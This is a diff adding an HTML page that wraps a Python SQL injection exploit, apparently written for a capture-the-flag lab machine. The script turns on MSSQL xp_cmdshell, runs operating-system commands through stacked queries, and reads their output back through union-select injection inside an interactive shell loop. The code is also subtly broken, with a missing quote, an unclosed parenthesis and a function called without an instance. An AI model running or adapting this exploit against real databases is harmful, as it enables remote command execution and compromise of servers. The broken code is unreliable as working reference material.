@@ -1,0 +1,58 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Fighter MSSQL Shell</title>
+</head><body>#!/usr/bin/python3<br/>
+import requests<br/>
+from base64 import b64decode<br/>
+from urllib.parse import unquote<br/>
+<br/>
+class fighter(object):<br/>
+&nbsp; &nbsp; # Allows for easy debugging<br/>
+&nbsp; &nbsp; def __init__(self, proxies='http://127.0.0.1:8080'):<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; # Here is the URL definition<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; self.url = http://members.streetfighterclub.htb/old/verify.asp"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; self.proxies = {'http':proxies}<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; # SQL Injections<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; self.enableXPShell = "1; EXEC sp_configure 'show advanced options', 1; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;-- -"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; print(self.enableXPShell);<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; self.createTable = "1; CREATE TABLE ippsec (ID int IDENTITY(1,1) PRIMARY KEY, output varchar(1024))"<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; self.truncateTable = "1; TRUNCATE TABLE ippsec;"<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; self.getIndex = "1 union select 1,2,3,4,(select top 1 ID from ippsec order by ID desc),6-- -"<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; # setup exploit<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; self.makeRequest(self.enableXPShell)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; self.makeRequest(self.createTable)<br/>
+<br/>
+&nbsp; &nbsp; def makeRequest(self, action):<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; return requests.post(self.url, proxies=self.proxies, allow_redirects=False, data={'username':'admin', 'password':'PleaseSubscribe', 'logintype':action, 'rememberme':'ON', 'B1':'LogIn'}<br/>
+<br/>
+&nbsp; &nbsp; def runCMD(self, cmd):<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; # Truncate Table means to erase the table<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; self.makeRequest(self.truncateTable)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; cmd = cmd.replace("'","''") #escape output <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; self.makeRequest(f"1; insert into ippsec (output) exec Xp_CmDShElL '{cmd}';-- -")<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; self.getOutput()<br/>
+<br/>
+&nbsp; &nbsp; def decodeCookies(self, cookies):<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; return b64decode(unquote(cookies['Email']))<br/>
+<br/>
+&nbsp; &nbsp; def getOutput(self):<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; r = self.makeRequest(self.getIndex)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; count = int(self.decodeCookies(r.cookies))<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; for x in range(1,count):<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; line = self.makeRequest(f'1 union select 1,2,3,4,(select top 1 output from ippsec where ID = {x}),6-- -')<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; try:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; output = self.decodeCookies(line.cookies)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(output.decode())<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; except:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; None<br/>
+<br/>
+while True:<br/>
+&nbsp; &nbsp; PleaseWork = input("SHELL &gt; ")<br/>
+&nbsp; &nbsp; runCMD(PleaseWork)</body></html>
